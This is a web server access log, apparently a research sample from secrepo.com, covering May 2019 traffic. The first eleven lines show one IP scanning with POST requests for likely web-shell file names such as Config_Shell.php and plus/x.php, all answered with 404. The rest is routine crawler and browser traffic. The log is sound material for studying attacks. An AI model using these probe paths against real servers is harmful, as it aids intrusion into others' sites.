116.255.161.64 - - [07/May/2019:12:53:11 -0700] "POST //plus/laobiao.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/laobiao.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:12 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:12 -0700] "POST //plus/lucas.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:15 -0700] "POST //plus/read.php HTTP/1.1" 404 295 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:17 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:17 -0700] "POST //Config_Shell.php HTTP/1.1" 404 294 "http://www.secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:17 -0700] "POST //plus/mybak.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:19 -0700] "POST //plus/x.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:21 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:21 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.161.64 - - [07/May/2019:12:53:22 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
207.46.13.190 - - [07/May/2019:12:54:54 -0700] "GET /self.logs/access.log.2018-02-03.gz HTTP/1.1" 200 21899 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
50.17.74.10 - - [07/May/2019:12:56:09 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; startmebot/1.0; +https://start.me/bot)" 
209.15.209.89 - - [07/May/2019:13:04:35 -0700] "HEAD / HTTP/1.1" 200 239 "-" "-" 
104.129.204.110 - - [07/May/2019:13:04:35 -0700] "GET / HTTP/1.1" 200 12455 "https://www.researchgate.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
104.129.204.110 - - [07/May/2019:13:04:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
104.129.204.110 - - [07/May/2019:13:04:35 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
104.129.204.110 - - [07/May/2019:13:04:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
113.171.224.176 - - [07/May/2019:13:13:26 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
202.47.49.167 - - [07/May/2019:13:14:07 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
202.47.49.167 - - [07/May/2019:13:14:09 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
202.47.49.167 - - [07/May/2019:13:14:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
